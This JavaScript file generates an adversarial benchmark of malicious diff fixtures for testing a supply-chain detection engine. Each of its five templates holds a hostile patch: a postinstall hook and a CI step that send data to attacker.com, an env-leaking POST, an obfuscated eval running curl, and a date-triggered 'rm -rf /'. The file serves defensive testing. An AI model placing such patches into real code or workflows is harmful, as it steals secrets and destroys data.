/**
 * Sentinel: Adversarial Benchmark Generator (v1.0)
 * 
 * Generates 500+ malicious fixtures across 5 critical attack families
 * to stress-test the v8.0 Production engine.
 */

'use strict';

const fs = require('fs');
const path = require('path');

const OUTPUT_DIR = path.join(__dirname, '../benchmarks/adversarial');
if (!fs.existsSync(OUTPUT_DIR)) fs.mkdirSync(OUTPUT_DIR, { recursive: true });

const FAMILIES = {
    SUPPLY_CHAIN: {
        template: (i) => ({
            id: `MAL-SC-${i}`,
            repo: 'expressjs/express',
            filename: 'package.json',
            patch: `@@ -5,5 +5,5 @@\n-  "scripts": { "test": "mocha" }\n+  "scripts": { "postinstall": "node -e \\"require('http').get('http://attacker.com/p?c=' + require('os').hostname())\\"" }`
        }),
        count: 100
    },
    EXFILTRATION: {
        template: (i) => ({
            id: `MAL-EX-${i}`,
            repo: 'facebook/react',
            filename: 'src/auth/session.js',
            patch: `@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }`
        }),
        count: 100
    },
    OBFUSCATION: {
        template: (i) => ({
            id: `MAL-OB-${i}`,
            repo: 'lodash/lodash',
            filename: 'lodash.js',
            patch: `@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }`
        }),
        count: 100
    },
    CI_POISONING: {
        template: (i) => ({
            id: `MAL-CI-${i}`,
            repo: 'vercel/next.js',
            filename: '.github/workflows/deploy.yml',
            patch: `@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d "s=$GITHUB_TOKEN" https://attacker.com/harvest`
        }),
        count: 100
    },
    SLEEPER: {
        template: (i) => ({
            id: `MAL-SL-${i}`,
            repo: 'colinhacks/zod',
            filename: 'src/index.ts',
            patch: `@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }`
        }),
        count: 100
    }
};

const allFixtures = [];
Object.keys(FAMILIES).forEach(familyKey => {
    const family = FAMILIES[familyKey];
    for (let i = 1; i <= family.count; i++) {
        allFixtures.push(family.template(i));
    }
});

fs.writeFileSync(path.join(OUTPUT_DIR, 'suite_500.json'), JSON.stringify(allFixtures, null, 2));
console.log(`✨ Generated ${allFixtures.length} adversarial fixtures in ${OUTPUT_DIR}/suite_500.json`);
